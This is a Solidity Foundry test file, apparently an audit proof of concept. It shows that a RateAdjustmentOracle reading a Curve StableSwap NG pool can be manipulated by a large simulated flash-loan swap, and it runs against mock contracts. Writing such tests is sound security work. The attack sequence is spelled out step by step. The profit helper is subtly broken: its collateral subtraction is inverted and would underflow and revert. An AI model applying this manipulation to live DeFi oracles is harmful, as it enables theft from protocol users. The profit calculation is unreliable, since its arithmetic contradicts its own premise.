// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/interfaces/IRateAdjustmentOracle.sol";
import "../../src/interfaces/IPrincipalToken.sol";
import "../../src/interfaces/IStableSwapNG.sol";
import "../../src/libraries/RayMath.sol";
import "./OracleVulnerabilityMocks.sol";

/**
 * @title RateAdjustmentOracle Price Manipulation Vulnerability Test
 * @notice This test demonstrates a critical vulnerability in the RateAdjustmentOracle
 * where an attacker can manipulate the Curve StableSwap NG pool price to affect oracle readings
 */
contract RateAdjustmentOracleManipulationTest is Test {
    // Test contracts
    MockStableSwapNG public curvePool;
    MockPrincipalToken public pt;
    MockRateAdjustmentOracle public oracle;

    // Constants
    uint256 private constant INITIAL_PRICE = 0.95e18; // 95% of face value
    uint256 private constant LARGE_AMOUNT = 10_000_000e18; // 10M tokens for manipulation
    
    function setUp() public {
        // Deploy mock contracts
        pt = new MockPrincipalToken();
        curvePool = new MockStableSwapNG(address(0), address(pt)); // IBT address not needed for this test
        oracle = new MockRateAdjustmentOracle(address(curvePool), INITIAL_PRICE);

        // Initialize PT with initial rate
        pt.setPTRate(RayMath.toRay(INITIAL_PRICE, 18)); // Convert from 18 decimals to RAY (27 decimals)
    }

    function testPriceManipulationVulnerability() public {
        // 1. Get initial oracle reading
        uint256 initialOraclePrice = oracle.value();
        console.log("Initial oracle price:", initialOraclePrice);

        // 2. Simulate flash loan attack - large sell of PT
        curvePool.exchange(0, 1, LARGE_AMOUNT, 0, address(this));
        
        // 3. Get manipulated oracle reading
        uint256 manipulatedPrice = oracle.value();
        console.log("Manipulated oracle price:", manipulatedPrice);

        // 4. Calculate price impact
        uint256 priceDeviation = (initialOraclePrice - manipulatedPrice) * 100 / initialOraclePrice;
        console.log("Price deviation percentage:", priceDeviation, "%");

        // 5. Assert significant price manipulation
        assertTrue(
            manipulatedPrice < initialOraclePrice * 90 / 100, 
            "Price should be manipulated down by at least 10%"
        );

        // 6. Demonstrate potential profit from manipulation
        uint256 potentialProfit = calculatePotentialProfit(initialOraclePrice, manipulatedPrice);
        console.log("Potential profit from manipulation:", potentialProfit);
        assertTrue(potentialProfit > 0, "Attack should be profitable");
    }

    function calculatePotentialProfit(
        uint256 originalPrice, 
        uint256 manipulatedPrice
    ) internal pure returns (uint256) {
        // Example: If attacker borrows 1M tokens using manipulated price as collateral
        uint256 borrowAmount = 1_000_000e18;
        
        // Calculate how much collateral needed at manipulated price vs original price
        uint256 collateralAtManipulatedPrice = (borrowAmount * 1e18) / manipulatedPrice;
        uint256 collateralAtOriginalPrice = (borrowAmount * 1e18) / originalPrice;
        
        // Profit is the difference in required collateral
        return collateralAtOriginalPrice - collateralAtManipulatedPrice;
    }
} 
